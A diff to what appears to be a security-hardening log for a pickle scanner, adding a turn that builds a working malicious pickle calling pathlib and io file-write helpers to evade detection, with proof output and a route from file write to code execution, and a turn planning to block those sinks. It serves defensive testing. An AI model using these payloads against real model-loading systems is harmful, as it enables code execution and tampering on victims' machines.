@@ -5787,3 +5787,138 @@ Blocking plan:
 
 Performance note: one literal in the existing magic-method matcher, no file
 API blocklist expansion and no PathLike data-flow modeling.
+
+## Turn 109 - Direct clean file-write sink gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using direct stdlib file-write
+helpers that are currently clean call targets.
+
+Candidate payload:
+
+- Construct a `pathlib.PosixPath` marker path.
+- Call `pathlib.Path.write_text(path, payload)` directly during unpickling.
+- Use no dangerous builtin `open` reference, no shell module, and no synthetic
+  protocol method seed.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_direct_path_write_text_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("pathlib", type(marker).__name__),
+        text(str(marker)),
+        b"\x85R\x94",
+        sg("pathlib", "Path.write_text"),
+        b"h\x00",
+        text("owned-by-path-write-text"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Control scanner result: `len=65`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=123`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=123`, `bytes_total=123`,
+  `opcode_count=16`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `pathlib.PosixPath` and
+  `pathlib.Path.write_text`, both with `is_dangerous=False`
+- Control proof: the same pickle without the `Path.write_text` call returns a
+  `PosixPath` instance at `/tmp/ma_direct_path_write_text_marker` and does not
+  create the marker
+- Unpickle result: the full payload returns `24`, creates
+  `/tmp/ma_direct_path_write_text_marker` with mode `0o644`, and writes
+  `owned-by-path-write-text`
+
+Sibling sink proof:
+
+| Helper sequence | Scanner verdict | Runtime result |
+| --- | --- | --- |
+| `pathlib.Path.write_text(path, text)` | clean, 0 findings, 0 notices | file created with attacker text, returns byte count |
+| `pathlib.Path.write_bytes(path, bytes)` | clean, 0 findings, 0 notices | file created with attacker bytes, returns byte count |
+| `pathlib.Path.touch(path)` | clean, 0 findings, 0 notices | file created, returns `None` |
+| `pathlib.Path.open(path, "w")` plus `_io.TextIOWrapper.write/close` | clean, 0 findings, 0 notices | file created with attacker text, returns `None` |
+| `io.open(path, "w")` plus `_io.TextIOWrapper.write/close` | clean, 0 findings, 0 notices | file created with attacker text, returns `None` |
+| `_io.open(path, "w")` plus `_io.TextIOWrapper.write/close` | clean, 0 findings, 0 notices | file created with attacker text, returns `None` |
+| `_io.FileIO(path, "w")` plus `_io.FileIO.write/close` | clean, 0 findings, 0 notices | file created with attacker bytes, returns `None` |
+
+RCE mechanism:
+
+- Pickle `REDUCE` can call ordinary Python and C file helpers directly.
+- `pathlib.Path.write_text(path, payload)` opens the attacker-chosen path,
+  writes attacker-controlled text, closes the file, and returns the character
+  count before `pickle.loads()` returns.
+- The `_io` and `io` variants expose the same primitive through clean file
+  constructors and clean unbound write/close methods.
+- In a model-loading process, arbitrary file write can become code execution by
+  placing `.pth` startup hooks, `sitecustomize.py`, package metadata, shell
+  config, service config, or other loader-controlled files in writable
+  locations.
+
+Why the scanner missed it:
+
+- `pathlib.Path.write_text`, `pathlib.Path.write_bytes`,
+  `pathlib.Path.open`, `pathlib.Path.touch`, `io.open`, `_io.open`,
+  `_io.FileIO`, `_io.TextIOWrapper.write`, `_io.TextIOWrapper.close`,
+  `_io.FileIO.write`, and `_io.FileIO.close` are absent from
+  `DANGEROUS_GLOBALS`.
+- `pathlib`, `io`, and `_io` are not wildcard-dangerous modules.
+- The existing builtins block covers `builtins.open`, but these aliases and
+  method forms reach the same filesystem-write primitive under different
+  module/name pairs.
+- No suspicious magic-method string is required; this is direct `REDUCE`
+  execution of currently clean file-write sinks.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for the RCE-grade direct file-write sinks rather than modeling file
+handles or argument modes. At minimum, cover `pathlib.Path.write_text`,
+`pathlib.Path.write_bytes`, `pathlib.Path.open`, `io.open`, `_io.open`, and
+`_io.FileIO`; adding the unbound `_io` write methods is a conservative
+follow-on if the policy wants to flag active file object mutation
+independently of the constructor. `pathlib.Path.touch` is documented above as
+a clean file-create marker, but it is lower priority under the RCE-only scoring
+because it does not write attacker-controlled content by itself.
+
+## Turn 110 - Block direct file-write sinks
+
+Blocking plan:
+
+- Add exact dangerous-global entries for RCE-grade stdlib file-write sinks:
+  `pathlib.Path.write_text`, `pathlib.Path.write_bytes`,
+  `pathlib.Path.open`, `io.open`, `_io.open`, `_io.FileIO`,
+  `_io.TextIOWrapper.write`, and `_io.FileIO.write`.
+- Leave `pathlib.Path.touch` out of this focused block. It creates marker
+  files and remains useful as a low-impact proof primitive, but it does not
+  write attacker-controlled content by itself.
+- Add a CPython oracle regression for the Turn 109 sibling matrix. The
+  regression verifies a construction-only path control remains clean and
+  side-effect free, then verifies each active write sink is malicious and still
+  writes attacker-controlled bytes or text during `pickle.loads()`.
+- Update older setup-control expectations that intentionally write temporary
+  `.pth` or module files with `Path.write_text`; those controls are now
+  correctly malicious because the direct write sink itself is policy-blocked.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: eight exact entries in the existing sorted dangerous-global
+table and no file-handle state tracking, argument-mode inspection, or broad
+`pathlib`/`io` wildcard module block.
